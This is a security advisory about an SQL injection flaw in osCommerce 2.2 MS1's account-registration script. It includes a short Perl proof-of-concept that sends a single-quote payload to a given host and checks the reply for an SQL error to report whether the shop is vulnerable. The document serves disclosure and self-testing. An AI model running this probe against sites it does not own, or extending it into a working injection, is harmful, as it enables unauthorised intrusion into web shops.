source: http://www.securityfocus.com/bid/9211/info

It has been reported that one of the scripts included with osCommerce fails to validate user-supplied input, rendering it vulnerable to a SQL injection attack. The script in question is used to verify account details during the new user registration process and has the filename "create_account_process.php". It may be possible for attackers to manipulate the query to corrupt data in the database or, possibly, gain access on the underlying host (through, for example, stored procedures or vulnerabilities in the database server). 

#!/usr/bin/perl
############################################################################
# osCommerce 2.2 MS1 Proof Of Concept - By JeiAr [ http://www.gulftech.org ]
############################################################################

use LWP::UserAgent;

############################################################################
# Use this script to test if your shop is vulnerable. Results are obvious :)
############################################################################

$ua = new LWP::UserAgent;
$ua->agent("Mozilla/4.0" . $ua->agent);

if (!$ARGV[0]) {
	&usage;
}
 
$host=$ARGV[0];

print "Trying $host ....\n";

my $req = new HTTP::Request POST => "http://$host/create_account_process.php";
   $req->content_type('application/x-www-form-urlencoded');
   $req->content("action=process&country=%27");
my $res = $ua->request($req); 
$pattern = "You have an error in your SQL syntax";  
$_ = $res->content;

print "\n" x 3;

if (/$pattern/) {
print "Host Is Vulnerable!\n";
print "Download The Latest osCommerce ...\n";
print "http://www.oscommerce.com/downloads\n";
} else {
print "Host NOT Vulnerable\n";
}

print "\n" x 3;

exit;

sub usage {

print "osCommerce 2.2 MS1 Proof Of Concept - By JeiAr [ http://www.gulftech.org ]\n";
print "--------------------------------------------------------------------------\n";
print "perl ossqlin.pl \"path to shop\" ex: ossqlin.pl www.mywebstore.com/catalog\n";

exit;

}